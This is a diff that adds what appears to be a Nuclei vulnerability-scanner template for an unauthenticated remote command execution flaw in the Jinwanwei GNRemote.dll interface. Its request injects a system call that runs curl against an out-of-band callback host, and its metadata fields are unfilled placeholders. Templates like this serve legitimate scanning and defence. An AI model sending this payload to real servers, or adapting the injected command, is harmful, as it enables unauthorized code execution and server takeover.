@@ -1,0 +1,21 @@
+id: jww-GNRemote-rce
+
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: 金万维-云联应用系统接入平台 GNRemote.dll接口存在远程命令执行漏洞，未经身份验证的远程攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+  reference:
+    - https://github.com/wy876/POC/blob/1ff8a0f8154bdaf1dbf0148f25af1d2d38d24f96/%E9%87%91%E4%B8%87%E7%BB%B4-%E4%BA%91%E8%81%94%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%85%A5%E5%B9%B3%E5%8F%B0GNRemote.dll%E5%89%8D%E5%8F%B0%E5%AD%98%E5%9C%A8RCE%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/GNRemote.dll?GNFunction=CallPython&pyFile=os&pyFunc=system&pyArgu=curl+{{interactsh-url}}"
+
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
